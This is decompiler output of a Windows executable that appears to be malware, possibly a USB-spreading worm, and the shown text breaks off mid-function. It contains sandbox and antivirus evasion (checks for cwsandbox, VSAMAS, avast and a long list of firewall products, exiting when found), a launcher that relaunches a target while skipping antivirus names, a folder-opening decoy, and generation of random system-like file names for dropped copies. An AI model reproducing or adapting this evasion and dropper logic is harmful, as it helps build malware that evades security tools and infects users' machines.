typedef unsigned char   undefined;

typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef unsigned short    wchar16;
typedef struct tagMSG tagMSG, *PtagMSG;

typedef struct tagMSG MSG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef ulong DWORD;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

typedef long LONG;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagMSG {
    HWND hwnd;
    UINT message;
    WPARAM wParam;
    LPARAM lParam;
    DWORD time;
    POINT pt;
};

struct HWND__ {
    int unused;
};

typedef struct tagMSG *LPMSG;

typedef LONG_PTR LRESULT;

typedef LRESULT (*HOOKPROC)(int, WPARAM, LPARAM);

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void *HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef ushort WORD;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _OFSTRUCT _OFSTRUCT, *P_OFSTRUCT;

typedef uchar BYTE;

typedef char CHAR;

struct _OFSTRUCT {
    BYTE cBytes;
    BYTE fFixedDisk;
    WORD nErrCode;
    WORD Reserved1;
    WORD Reserved2;
    CHAR szPathName[128];
};

typedef struct _MEMORYSTATUS _MEMORYSTATUS, *P_MEMORYSTATUS;

typedef ULONG_PTR SIZE_T;

struct _MEMORYSTATUS {
    DWORD dwLength;
    DWORD dwMemoryLoad;
    SIZE_T dwTotalPhys;
    SIZE_T dwAvailPhys;
    SIZE_T dwTotalPageFile;
    SIZE_T dwAvailPageFile;
    SIZE_T dwTotalVirtual;
    SIZE_T dwAvailVirtual;
};

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef CHAR *LPSTR;

typedef BYTE *LPBYTE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _MEMORYSTATUS *LPMEMORYSTATUS;

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _OFSTRUCT *LPOFSTRUCT;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef CHAR *LPCSTR;

typedef DWORD ACCESS_MASK;

typedef short SHORT;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef struct HBITMAP__ HBITMAP__, *PHBITMAP__;

struct HBITMAP__ {
    int unused;
};

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HHOOK__ HHOOK__, *PHHOOK__;

struct HHOOK__ {
    int unused;
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HDC__ HDC__, *PHDC__;

struct HDC__ {
    int unused;
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef long *LPLONG;

typedef struct _FILETIME *LPFILETIME;

typedef struct HDC__ *HDC;

typedef struct tagRECT tagRECT, *PtagRECT;

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef int HFILE;

typedef struct tagRECT *LPRECT;

typedef HANDLE HGLOBAL;

typedef void *HGDIOBJ;

typedef void *LPCVOID;

typedef struct HHOOK__ *HHOOK;

typedef DWORD COLORREF;

typedef struct HBITMAP__ *HBITMAP;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_2 IMAGE_RESOURCE_DIR_STRING_U_2, *PIMAGE_RESOURCE_DIR_STRING_U_2;

struct IMAGE_RESOURCE_DIR_STRING_U_2 {
    word Length;
    wchar16 NameString[1];
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef UINT MCIDEVICEID;

typedef DWORD MCIERROR;

typedef struct sockaddr sockaddr, *Psockaddr;

typedef ushort u_short;

struct sockaddr {
    u_short sa_family;
    char sa_data[14];
};

typedef struct WSAData WSAData, *PWSAData;

typedef struct WSAData WSADATA;

struct WSAData {
    WORD wVersion;
    WORD wHighVersion;
    char szDescription[257];
    char szSystemStatus[129];
    ushort iMaxSockets;
    ushort iMaxUdpDg;
    char *lpVendorInfo;
};

typedef UINT_PTR SOCKET;

typedef WSADATA *LPWSADATA;

typedef struct hostent hostent, *Phostent;

struct hostent {
    char *h_name;
    char **h_aliases;
    short h_addrtype;
    short h_length;
    char **h_addr_list;
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef longlong __time64_t;

typedef __time64_t time_t;

typedef int intptr_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};




void FUN_00401100(void)

{
  int *piVar1;
  UINT uExitCode;
  char **local_10;
  _startupinfo local_c;
  
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)&LAB_00401000);
  FUN_004214a0();
  local_c.newmode = 0;
  __getmainargs(&DAT_00428004,(char ***)&DAT_00428000,&local_10,DAT_004230c0,&local_c);
  if (DAT_0042c1a0 != 0) {
    DAT_004230d0 = DAT_0042c1a0;
    if (_iob_exref != (code *)0x0) {
      _setmode(*(int *)(_iob_exref + 0x10),DAT_0042c1a0);
    }
    if (_iob_exref != (code *)0xffffffe0) {
      _setmode(*(int *)(_iob_exref + 0x30),DAT_0042c1a0);
    }
    if (_iob_exref != (code *)0xffffffc0) {
      _setmode(*(int *)(_iob_exref + 0x50),DAT_0042c1a0);
    }
  }
  piVar1 = (int *)__p__fmode();
  *piVar1 = DAT_004230d0;
  FUN_00421470();
  __p__environ();
  uExitCode = FUN_00421350();
  _cexit();
                    // WARNING: Subroutine does not return
  ExitProcess(uExitCode);
}



void entry(void)

{
  __set_app_type(2);
                    // WARNING: Subroutine does not return
  FUN_00401100();
}



void FUN_00401260(void)

{
                    // WARNING: Could not recover jumptable at 0x0040126a. Too many branches
                    // WARNING: Treating indirect jump as call
  atexit();
  return;
}



void FUN_004023c0(void)

{
  char *_Str;
  char *_Str_00;
  BOOL BVar1;
  char acStack_20 [8];
  undefined *local_18;
  char *local_14;
  
  local_18 = &stack0xffffffd4;
  _Str = getenv("PROGRAMFILES");
  _Str_00 = getenv("SYSTEMDRIVE");
  local_14 = getenv("WINDIR");
  strlen(_Str);
  strlen(_Str_00);
  FUN_00421910();
  sprintf(acStack_20,"%s\\Agnitum");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\COMODO");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\Zone Labs");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\AtGuard");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\kerio\\WinRoute Firewall");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\Norton Internet Security");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\Sygate");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\ISS\\BlackICE");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\VisNetic Firewall");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\Soft4Ever\\looknstop");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\Kaspersky Lab\\Kaspersky Anti-Hacker");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\Tiny Personal Firewall");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\McAfee\\MPF");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 != 0) {
    DAT_00428010 = 1;
  }
  sprintf(acStack_20,"%s\\VSAMAS");
  BVar1 = PathFileExistsA(acStack_20);
  if (BVar1 == 0) {
    sprintf(acStack_20,"%s\\cwsandbox");
    BVar1 = PathFileExistsA(acStack_20);
    if (BVar1 == 0) {
      sprintf(acStack_20,"%s\\System32\\aswcmdasw.exe");
      BVar1 = PathFileExistsA(acStack_20);
      if (BVar1 == 0) {
        return;
      }
    }
  }
                    // WARNING: Subroutine does not return
  exit(0);
}



void FUN_004026f0(void)

{
  bool bVar1;
  int *piVar2;
  char *pcVar3;
  size_t sVar4;
  int iVar5;
  int iVar6;
  char *pcVar7;
  undefined uVar8;
  _PROCESS_INFORMATION _Stack_325cc;
  _STARTUPINFOA _Stack_325bc;
  char acStack_3256c [102672];
  char acStack_1945c [272];
  char acStack_1934c [272];
  char acStack_1923c [272];
  undefined2 auStack_1912c [51200];
  char local_12c [280];
  undefined4 uStack_14;
  
  uStack_14 = 0x402700;
  FUN_00421910();
  local_12c[0] = '\0';
  iVar6 = 0;
  bVar1 = false;
  uStack_14 = 0x40271c;
  piVar2 = (int *)__p___argc();
  if (0 < *piVar2) {
    do {
      uVar8 = !bVar1;
      if ((bool)uVar8) {
        uStack_14 = 0x40272e;
        piVar2 = (int *)__p___argv();
        iVar5 = 7;
        pcVar3 = *(char **)(*piVar2 + iVar6 * 4);
        pcVar7 = "/START";
        do {
          if (iVar5 == 0) break;
          iVar5 = iVar5 + -1;
          uVar8 = *pcVar3 == *pcVar7;
          pcVar3 = pcVar3 + 1;
          pcVar7 = pcVar7 + 1;
        } while ((bool)uVar8);
        iVar5 = iVar6;
        if ((bool)uVar8) {
          bVar1 = true;
          iVar5 = iVar6 + 1;
          uStack_14 = 0x4027dd;
          piVar2 = (int *)__p___argc();
          if (iVar5 < *piVar2) {
            uStack_14 = 0x4027ea;
            piVar2 = (int *)__p___argv();
            iVar6 = iVar6 + 2;
            uStack_14 = 0x402802;
            strcpy(local_12c,*(char **)(*piVar2 + iVar5 * 4));
            goto LAB_00402747;
          }
        }
        iVar6 = iVar5 + 1;
      }
      else {
        uStack_14 = 0x402795;
        piVar2 = (int *)__p___argv();
        iVar5 = iVar6 * 4;
        iVar6 = iVar6 + 1;
        uStack_14 = 0x4027ad;
        strcat((char *)auStack_1912c,*(char **)(*piVar2 + iVar5));
        uStack_14 = 0x4027bb;
        sVar4 = strlen((char *)auStack_1912c);
        *(undefined2 *)((int)auStack_1912c + sVar4) = 0x20;
      }
LAB_00402747:
      uStack_14 = 0x40274c;
      piVar2 = (int *)__p___argc();
    } while (iVar6 < *piVar2);
  }
  if (bVar1) {
    iVar6 = 0;
    while( true ) {
      uStack_14 = 0x402780;
      pcVar3 = strstr(local_12c,(&PTR_s_avast_00423000)[iVar6]);
      if (pcVar3 != (char *)0x0) break;
      iVar6 = iVar6 + 1;
      if (0x25 < iVar6) {
        uStack_14 = 0x40282f;
        _splitpath(local_12c,acStack_1923c,acStack_1934c,(char *)0x0,(char *)0x0);
        uStack_14 = 0x402854;
        sprintf(acStack_1945c,"%s%s");
        uStack_14 = 0x402861;
        SetCurrentDirectoryA(acStack_1945c);
        uStack_14 = 0x402889;
        sprintf(acStack_3256c,"\"%s\" %s");
        uStack_14 = 0x4028c9;
        CreateProcessA((LPCSTR)0x0,acStack_3256c,(LPSECURITY_ATTRIBUTES)0x0,
                       (LPSECURITY_ATTRIBUTES)0x0,0,0x100,(LPVOID)0x0,(LPCSTR)0x0,&_Stack_325bc,
                       &_Stack_325cc);
        return;
      }
    }
  }
  return;
}



HINSTANCE FUN_004028e0(void)

{
  uint uVar1;
  HINSTANCE pHVar2;
  uint *puVar3;
  uint *puVar4;
  uint uVar5;
  CHAR aCStack_123 [7];
  uint local_11c [69];
  
  GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_11c,0x104);
  puVar3 = local_11c;
  do {
    puVar4 = puVar3;
    puVar3 = puVar4 + 1;
    uVar5 = *puVar4 + 0xfefefeff & ~*puVar4;
    uVar1 = uVar5 & 0x80808080;
  } while (uVar1 == 0);
  if ((uVar5 & 0x8080) == 0) {
    uVar1 = uVar1 >> 0x10;
    puVar3 = (uint *)((int)puVar4 + 6);
  }
  pHVar2 = (HINSTANCE)(uVar1 & 0xffffff00);
  puVar4 = local_11c;
  if ((LPCSTR)0x3 <
      (LPCSTR)((int)puVar3 + ((-3 - (uint)CARRY1((byte)uVar1,(byte)uVar1)) - (int)local_11c))) {
    do {
      puVar3 = puVar4;
      puVar4 = puVar3 + 1;
      uVar5 = *puVar3 + 0xfefefeff & ~*puVar3;
      uVar1 = uVar5 & 0x80808080;
    } while (uVar1 == 0);
    if ((uVar5 & 0x8080) == 0) {
      uVar1 = uVar1 >> 0x10;
      puVar4 = (uint *)((int)puVar3 + 6);
    }
    *(CHAR *)((int)puVar4 +
             (int)(aCStack_123 + (-(int)local_11c - (uint)CARRY1((byte)uVar1,(byte)uVar1)))) = '\0';
    pHVar2 = (HINSTANCE)PathFileExistsA((LPCSTR)local_11c);
    if (pHVar2 != (HINSTANCE)0x0) {
      pHVar2 = ShellExecuteA((HWND)0x0,"open","explorer",(LPCSTR)local_11c,(LPCSTR)0x0,5);
    }
  }
  return pHVar2;
}



void __cdecl FUN_004029e0(char *param_1,int param_2)

{
  undefined2 uVar1;
  int iVar2;
  uint uVar3;
  BOOL BVar4;
  FILE *_File;
  uint *puVar5;
  bool bVar6;
  char acStack_150 [4];
  longlong local_14c;
  int local_140;
  int local_130;
  undefined *local_12c;
  int local_128;
  undefined4 local_124;
  uint local_11c;
  uint local_118;
  ushort uStack_116;
  ushort local_114;
  undefined local_112;
  
  if (param_2 < 2) {
    local_130 = rand();
    local_128 = 0;
    local_130 = local_130 % 10;
    bVar6 = false;
    iVar2 = -local_130;
    while( true ) {
      if (bVar6 == iVar2 < 0) break;
      iVar2 = rand();
      if (0xf < (uint)(iVar2 % 0x10)) goto LAB_00402a70;
      switch(iVar2 % 0x10) {
      case 0:
        local_11c = 0x786666;
        break;
      case 1:
        local_11c = 0x7379736d;
        goto LAB_00402a5d;
      case 2:
        local_11c = 0x7461646d;
        local_118 = CONCAT22(uStack_116,0x61);
        break;
      case 3:
        local_11c = 0x7473756c;
        goto LAB_00402a5d;
      case 4:
        local_11c = 0x6d786369;
        local_118 = CONCAT22(uStack_116,0x6c);
        break;
      case 5:
        uVar1 = 0x32;
        local_11c = 0x3377746e;
        goto LAB_00402d78;
      case 6:
        local_11c = 0x6e696561;
        uVar1 = 0x76;
LAB_00402d78:
        local_118 = CONCAT22(uStack_116,uVar1);
        break;
      case 7:
        local_11c = 0x73647061;
        goto LAB_00402a5d;
      case 8:
        local_11c = 0x7368746e;
        local_118 = 0x767265;
        break;
      case 9:
        uStack_116 = uStack_116 & 0xff00;
        local_11c = 0x6e6c6574;
        local_118 = CONCAT22(uStack_116,0x3233);
        break;
      case 10:
        local_11c = 0x6e65706f;
        local_118 = 0x687373;
        break;
      case 0xb:
        local_11c = 0x5f767273;
        local_118 = 0x363878;
        break;
      case 0xc:
        local_112 = 0;
        local_11c = 0x6b636f73;
        local_118 = 0x785f7465;
        local_114 = 0x3638;
        break;
      case 0xd:
        local_11c = 0x3233746e;
LAB_00402a5d:
        local_118 = local_118 & 0xffffff00;
        break;
      case 0xe:
        local_11c = 0x6e6e6977;
        local_118 = 0x323374;
        break;
      case 0xf:
        local_114 = local_114 & 0xff00;
        local_11c = 0x77677963;
        local_118 = 0x32336e69;
      }
LAB_00402a70:
      uVar3 = rand();
      puVar5 = &local_11c;
      if ((uVar3 & 1) == 0) {
        do {
          uVar3 = *puVar5;
          puVar5 = puVar5 + 1;
        } while ((uVar3 + 0xfefefeff & ~uVar3 & 0x80808080) == 0);
        local_12c = &stack0xfffffe94;
        strlen(param_1);
        FUN_00421910();
        iVar2 = rand();
        if ((uint)(iVar2 % 8) < 8) {
          switch(iVar2 % 8) {
          case 0:
            local_124 = 0x746164;
            break;
          case 1:
            local_124 = 0x6c6c64;
            break;
          case 2:
            local_124 = 0x657865;
            break;
          case 3:
            local_124 = 0x78636f;
            break;
          case 4:
